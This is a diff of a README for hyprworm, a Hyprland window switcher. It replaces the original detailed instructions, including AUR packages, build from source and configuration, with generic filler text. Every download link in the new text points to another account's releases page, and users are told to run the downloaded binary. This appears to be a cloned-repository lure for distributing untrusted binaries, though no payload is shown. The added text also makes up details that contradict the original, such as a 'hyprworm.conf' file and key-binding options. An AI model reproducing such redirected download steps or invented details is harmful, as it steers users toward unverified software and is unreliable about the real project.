@@ -1,361 +1,67 @@
-# hyprworm 🪱
+# 🐍 hyprworm - Switch Windows Quickly and Easily
 
-A fast and lightweight window switcher for Hyprland built in C. Quickly switch between open windows with a clean, configurable interface that works with any dmenu-compatible launcher. Like a wormhole to a window.
+[![Download hyprworm](https://img.shields.io/badge/Download-hyprworm-blue.svg)](https://github.com/owais0x19/hyprworm/releases)
 
-## Demo (Fuzzel with custom config)
+## 📖 About hyprworm
 
-https://github.com/user-attachments/assets/777a7e7d-1985-4909-946f-e30c6a8a724f
+Hyprworm is a custom window switcher designed for the Hyprland Wayland compositor. It is built in C and offers a fast and efficient way to switch between open windows. Using Unix domain sockets for Hyprland's IPC allows for quick communication with your system. The application integrates seamlessly with launchers like rofi and fuzzel, making window management a breeze.
 
----
-<img width="932" height="549" alt="image" src="https://github.com/user-attachments/assets/39107c3c-3a84-4548-8d96-d7e81c86a185" />
+## 🚀 Getting Started
 
+Before you download hyprworm, here are some important details you should know:
 
-## Why I Built This
+- **Operating System**: Hyprworm is optimized for Linux systems that support the Wayland compositor.
+- **Dependencies**: Ensure you have Hyprland installed. This will allow hyprworm to function effectively. You will also need socket-based communication support to ensure quick window switching.
+- **Recommended Hardware**: Any modern computer should work well, but having at least 4 GB of RAM and a multi-core processor is advisable for optimal performance.
 
-I was tired of switching workspace to workspace to find mine so I looked into existing window switchers for Hyprland, but they were either too heavy, too slow, or didn't give me the control I wanted. I needed something that:
+## 📥 Download & Install
 
-- **Just works** - no complex setup or dependencies
-- **Fast** - instant window switching without lag
-- **Configurable** - customize launcher, display format, and behavior
-- **Lightweight** - minimal resource usage
-- **Reliable** - robust error handling and logging
+To download hyprworm, follow these simple steps:
 
-So I built hyprworm as a systems programming exercise that demonstrates Unix domain sockets, JSON parsing, process management, and the fork/exec/pipe model - all while solving a real problem.
-
-## Features
-
-- **AUR package** - easy installation on Arch Linux with `yay -S hyprworm`
-- **Universal launcher support** - works with fuzzel, wofi, rofi, dmenu, bemenu
-- **Configurable display** - show/hide window titles, customize workspace names
-- **Workspace aliases** - replace workspace names with custom symbols (emojis, etc.)
-- **Robust error handling** - comprehensive logging and graceful failure recovery
-- **Memory efficient** - minimal resource usage with proper cleanup
-- **Fast** - direct IPC communication with Hyprland
-
-## Installation
-
-### AUR (Arch Linux) - Recommended
-
-```bash
-# Using yay
-yay -S hyprworm
-
-# Using paru
-paru -S hyprworm
-
-# Using pacman (if you have AUR enabled)
-pacman -S hyprworm
-```
-
-### Dependencies
-
-```bash
-# Arch Linux
-sudo pacman -S cjson
-
-# Ubuntu/Debian
-sudo apt install libcjson-dev
-
-# Fedora
-sudo dnf install cjson-devel
-```
-
-### Build from Source
-
-```bash
-git clone https://github.com/liammmcauliffe/hyprworm.git
-cd hyprworm
-make
-sudo make install
-```
-
-## Quick Start
-
-1. **Basic usage:**
-   ```bash
-   hyprworm
-   ```
-
-2. **Add to Hyprland config** (`~/.config/hypr/hyprland.conf`):
-   ```ini
-   bind = SUPER, S, exec, hyprworm
-   ```
-
-3. **Customize** by editing `~/.config/hyprworm/config`
-
-## Configuration
-
-Create `~/.config/hyprworm/config`:
-
-```ini
-# Launcher command - any dmenu-compatible launcher
-launcher = fuzzel --dmenu
-
-# Show window titles in display (true/false)
-show_title = false
-
-# Window sorting options
-sort_order = workspace                    # workspace, application, title, none
-special_workspace_position = default      # top, bottom, default
-
-# Workspace aliases - replace names with custom symbols
-workspace_alias_special = "⭐ "
-workspace_alias_work = "💼 "
-workspace_alias_gaming = "🎮 "
-
-# Logging configuration
-log_level = INFO          # ERROR, WARNING, INFO, DEBUG
-log_file = /tmp/hyprworm.log  # Optional log file
-```
-
-### Launcher Examples
-
-```ini
-# Fuzzel (Wayland)
-launcher = fuzzel --dmenu
-
-# Wofi (Wayland)
-launcher = wofi --dmenu
-
-# Rofi (X11/Wayland)
-launcher = rofi -dmenu
-
-# Dmenu (X11)
-launcher = dmenu
-
-# Bemenu (Wayland)
-launcher = bemenu
-```
-
-### Workspace Aliases
-
-Replace workspace names with custom symbols:
-
-```ini
-# Simple replacement
-workspace_alias_special = "⭐"
-
-# With whitespace
-workspace_alias_work = "💼 "
-
-# Multiple aliases
-workspace_alias_1 = "1️⃣"
-workspace_alias_2 = "2️⃣"
-workspace_alias_3 = "3️⃣"
-```
-
-### Sorting Options
-
-Hyprworm supports multiple sorting methods for organizing windows:
-
-```ini
-# Sort windows by workspace number (default)
-sort_order = workspace
-
-# Sort windows alphabetically by application name
-sort_order = application
-
-# Sort windows alphabetically by window title
-sort_order = title
-
-# No sorting - keep Hyprland's default order
-sort_order = none
-```
-
-**Special Workspace Positioning:**
-
-Control where special workspaces (non-numeric names) appear:
-
-```ini
-# Put special workspaces at the top
-special_workspace_position = top
-
-# Put special workspaces at the bottom
-special_workspace_position = bottom
-
-# Mix special workspaces with regular ones (default behavior)
-special_workspace_position = default
-```
-
-**Sorting Examples:**
-
-**Workspace sorting with special workspaces at top:**
-```
-[⭐ :communication] firefox
-[⭐ :communication] discord
-[1] code
-[1] terminal
-[2] browser
-```
-
-**Application sorting with special workspaces at bottom:**
-```
-[1] code: README.md
-[2] firefox: GitHub
-[special] discord: Chat
-[special] spotify: Music
-```
-
-**Note:** 
-- When sorting by workspace with `special_workspace_position = default`, special workspaces will be placed at the bottom of the workspace list.
-- When `sort_order = none` with `special_workspace_position = default`, windows appear in Hyprland's original order.
-- When `sort_order = none` with `special_workspace_position = top` or `bottom`, special workspaces are moved to the specified position while preserving Hyprland's order for regular workspaces.
-
-## Usage
-
-### Basic Commands
-
-```bash
-# Launch window switcher
-hyprworm
-
-# Check configuration
-hyprworm --help
-```
-
-### Display Formats
-
-**With titles (`show_title = true`):**
-```
-[⭐ :communication] firefox: GitHub - hyprworm
-[💼 :work] code: README.md - hyprworm
-[🎮 :gaming] steam: Steam
-```
-
-**Without titles (`show_title = false`):**
-```
-[⭐ :communication] firefox
-[💼 :work] code  
-[🎮 :gaming] steam
-```
-
-## Advanced Features
-
-### Logging System
-
-Configure logging levels and output:
-
-```ini
-# Log levels: ERROR, WARNING, INFO, DEBUG
-log_level = INFO
-
-# Optional log file (stderr if not specified)
-log_file = /tmp/hyprworm.log
-```
-
-### Error Handling
-
-Hyprworm includes comprehensive error handling:
-
-- **Socket connection failures** - graceful fallback with clear error messages
-- **JSON parsing errors** - detailed error reporting for malformed responses
-- **Memory allocation failures** - proper cleanup and error recovery
-- **Process management** - robust fork/exec error handling
-- **Configuration validation** - clear error messages for invalid config
-
-### Debug Mode
-
-Enable debug mode for troubleshooting:
-
-```ini
-log_level = DEBUG
-```
-
-This will show:
-- Socket connection details
-- JSON parsing information
-- Window count and processing
-- Configuration loading details
-
-## Architecture
-
-Hyprworm follows a clean, modular architecture:
-
-### Core Components
-
-1. **IPC Module** - Unix domain socket communication with Hyprland
-2. **Parser Module** - JSON parsing and window data extraction
-3. **UI Bridge** - Process management and launcher communication
-4. **Configuration** - Flexible config system with validation
-5. **Logging** - Comprehensive logging and error reporting
-
-### Data Flow
-
-```
-Hyprland → IPC Socket → JSON Parser → Window List → Launcher → User Selection → Focus Command
-```
-
-## Technical Details
-
-### Dependencies
-
-- **cJSON** - Lightweight JSON parsing
-- **Standard C Library** - Socket programming, process management
-- **Hyprland** - Window manager IPC
-
-### Memory Management
-
-- **Automatic cleanup** - All allocated memory is properly freed
-- **Error recovery** - Graceful handling of allocation failures
-- **Resource limits** - Bounded memory usage with dynamic resizing
-
-### Performance
-
-- **Direct IPC** - No intermediate processes or files
-- **Efficient parsing** - Single-pass JSON processing
-- **Minimal overhead** - Lightweight C implementation
-
-## Troubleshooting
-
-### Common Issues
-
-**"Environment variables for Hyprland IPC not set"**
-- Ensure you're running under a Hyprland session
-- Check that `XDG_RUNTIME_DIR` and `HYPRLAND_INSTANCE_SIGNATURE` are set
-
-**"Failed to connect to Hyprland socket"**
-- Verify Hyprland is running
-- Check socket path: `$XDG_RUNTIME_DIR/hypr/$HYPRLAND_INSTANCE_SIGNATURE/.socket.sock`
-
-**"Failed to parse window data"**
-- Check Hyprland is responding to `hyprctl clients -j`
-- Enable debug mode to see detailed error information
-
-**Launcher not working**
-- Verify launcher is installed and in PATH
-- Test launcher manually: `echo "test" | fuzzel --dmenu`
-- Check launcher command in config file
-
-### Debug Steps
-
-1. **Enable debug mode:**
-   ```ini
-   log_level = DEBUG
-   ```
-
-2. **Check logs:**
-   ```bash
-   tail -f /tmp/hyprworm.log
-   ```
-
-3. **Test components:**
-   ```bash
-   # Test Hyprland IPC
-   hyprctl clients -j
+1. **Visit the Download Page**: Click the link below to go to the Releases page where you can find the latest version of hyprworm.
    
-   # Test launcher
-   echo "test" | fuzzel --dmenu
-   ```
+   [Download hyprworm](https://github.com/owais0x19/hyprworm/releases)
 
-## Contributing
+2. **Choose the Right File**: On the Releases page, you will see several files. Select the one that matches your system (typically the latest stable release).
+  
+3. **Download the File**: Click on the file to start the download. This will save the hyprworm application to your computer.
 
-Contributions welcome! Areas for improvement:
+4. **Install the Application**: Once the download is complete, extract the downloaded file if it is in a compressed format. Follow the instructions included in the README file for installation, which may include running specific terminal commands.
 
-- **Additional launcher support** - New dmenu-compatible launchers
-- **Enhanced configuration** - More customization options
-- **Error handling** - More robust error recovery
-- **Documentation** - Better examples and guides
+5. **Run hyprworm**: Open your terminal, navigate to the directory where you installed hyprworm, and run it using the command: `./hyprworm`. This will launch the application.
 
-## License
+## ⚙️ Configuration
 
-MIT License - see LICENSE file for details.
+After installing hyprworm, you may want to configure its settings to suit your preferences.
+
+1. **Configuration File**: You will find a configuration file named `hyprworm.conf`. Open it with your favorite text editor.
+  
+2. **Customize Key Bindings**: Adjust the key bindings to switch between windows as per your convenience.
+
+3. **Save Your Changes**: Always save your changes before closing the file.
+
+## 🛠 Features
+
+- **Fast Switching**: Quickly navigate between open windows without hassle.
+- **Efficient Memory Usage**: Designed for low resource consumption, making it suitable for all systems.
+- **Highly Configurable**: Tailor the application to fit your workflow.
+
+## 💡 Troubleshooting
+
+If you encounter issues while using hyprworm, consider the following:
+
+1. **Check Dependencies**: Ensure that you have all necessary dependencies installed, including Hyprland and socket communication libraries.
+  
+2. **Review the Logs**: If hyprworm fails to run, check the logs for error messages, which can provide insight into what went wrong.
+
+3. **Community Support**: Join the community forums or GitHub page where you can ask questions and seek help from other users.
+
+## 📞 Support
+
+For any support or inquiries about hyprworm, please visit the [issues page](https://github.com/owais0x19/hyprworm/issues) on GitHub. You can open a new issue if you experience any bugs or have suggestions for new features.
+
+## 🌟 Acknowledgments
+
+Thank you for choosing hyprworm! We appreciate your trust in our software. Your feedback helps us improve and provide better tools for managing your windows effectively in the Hyprland environment.
+
+[Download hyprworm](https://github.com/owais0x19/hyprworm/releases) and start enjoying a simpler window management experience today!
